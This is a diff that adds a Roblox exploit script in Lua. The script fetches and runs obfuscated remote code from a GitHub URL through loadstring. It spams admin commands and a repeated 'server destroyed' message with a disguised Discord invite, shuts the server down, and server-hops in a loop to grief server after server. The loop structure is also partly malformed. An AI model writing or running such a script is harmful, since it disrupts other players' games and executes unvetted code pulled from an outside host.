@@ -1,0 +1,66 @@
+wait(4)
+local Players = game:GetService("Players")
+local HTTPService = game:GetService("HttpService")
+
+local allowedList = {"1676987923","3153706378","3152069224","345868431","839916604","333176446","57025672","2410515233"}
+local webLink = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
+
+ -- dk if task library is supported on exploits as i dont exploit
+ -- if not replace task.wait with wait()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/TheNootNootLord/BRO/main/Obfuscated_2.lua'))()
+wait(0.5)
+
+local function serverHop()
+    while true do
+        local serverList = {}
+        for _, v in pairs(HTTPService:JSONDecode(game:HttpGetAsync(webLink)).data) do
+            if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
+                table.insert(serverList,v.id)
+            end
+        end
+
+        if #serverList > 0 then
+            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, serverList[math.random(1, #serverList)])
+            break
+        end
+        wait(0.3)
+    end
+end 
+
+
+while wait(0.6) do
+Players.PlayerAdded:Connect(function(player)
+    if table.find(allowedList,player.UserId) then
+        task.spawn(serverHop)
+    end
+end)
+
+
+
+wait(1)
+game.Players:Chat(".regen")
+wait(0.4)
+game.Players:Chat(".pads")
+wait(0.3)
+game.Players:Chat(".allpads")
+wait(0.4)
+game.Players:Chat(":music 142912516")
+wait(0.4)
+game.Players:Chat(":h I rember 😀😀😀😀 Your server was destroyed by The Noot Noot Lord,  JOIN IF YOU WANT  desk o rd . gg/ kK Eq but way")
+wait(0.2)
+game.Players:Chat(":h I rember 😀😀😀😀 Your server was destroyed by The Noot Noot Lord,  JOIN IF YOU WANT  desk o rd . gg/ kK Eq but way")
+wait(0.2)
+game.Players:Chat(":h I rember 😀😀😀😀 Your server was destroyed by The Noot Noot Lord,  JOIN IF YOU WANT  desk o rd . gg/ kK Eq but way")
+wait(0.2)
+game.Players:Chat(":h I rember 😀😀😀😀 Your server was destroyed by The Noot Noot Lord,  JOIN IF YOU WANT  desk o rd . gg/ kK Eq but way")
+wait(0.1)
+game.Players:Chat(".shutdown")
+wait(1) -- this is to prevent server hopping instantly
+
+
+
+wait(1) -- this is to prevent server hopping instantly
+
+while wait(0.3) do
+    task.spawn(serverHop)
+end
